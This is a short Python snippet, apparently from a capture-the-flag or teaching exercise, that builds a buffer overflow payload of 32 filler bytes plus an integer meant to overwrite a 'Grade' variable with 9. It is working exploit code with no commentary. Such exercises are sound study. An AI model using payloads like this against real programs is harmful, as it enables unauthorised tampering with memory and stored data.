payload = b"A" * 32  
payload += b"\x09\x00\x00\x00"  # Overwrite Grade with 9
print(payload.decode())

